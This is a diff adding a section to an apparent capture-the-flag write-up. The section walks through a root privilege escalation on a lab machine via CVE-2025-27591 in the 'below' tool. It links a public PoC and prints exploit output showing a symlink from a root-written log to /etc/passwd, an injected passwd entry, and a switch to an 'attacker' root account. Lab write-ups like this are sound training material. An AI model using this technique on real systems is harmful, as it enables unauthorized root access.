@@ -492,5 +492,43 @@ drwxrwxr-x 13 root  syslog 4096 Jul 28 04:01 ..
 
 We can see 2 files error_jacob which are logs for jacob and error_root which is log for root.
 
-What we can do here is perform symlink attack 
+Further researching led to a Privilege Escalation vulnerability in below.
+
+### CVE-2025-27591
+
+Go to this git repo and open the poc file
+
+```http
+https://github.com/BridgerAlderson/CVE-2025-27591-PoC/tree/main
+```
+
+After that copy the contents of exploit.py and create a file in any writable directory in outbound.
+
+Then simply run:
+```bash
+python3 exploit.py 
+```
+
+#### Output
+```bash
+jacob@outbound:/var/log/below$ python3 exp.py 
+[*] Checking for CVE-2025-27591 vulnerability...
+[+] /var/log/below is world-writable.
+[!] /var/log/below/error_root.log is a regular file. Removing it...
+[+] Symlink created: /var/log/below/error_root.log -> /etc/passwd
+[+] Target is vulnerable.
+[*] Starting exploitation...
+[+] Wrote malicious passwd line to /tmp/attacker
+[+] Symlink set: /var/log/below/error_root.log -> /etc/passwd
+[*] Executing 'below record' as root to trigger logging...
+Jul 28 06:07:30.905 DEBG Starting up!
+Jul 28 06:07:30.906 ERRO 
+----------------- Detected unclean exit ---------------------
+Error Message: Failed to acquire file lock on index file: /var/log/below/store/index_01753660800: EAGAIN: Try again
+-------------------------------------------------------------
+[+] 'below record' executed.
+[*] Appending payload into /etc/passwd via symlink...
+[+] Payload appended successfully.
+[*] Attempting to switch to root shell via 'su attacker'...
+```
 
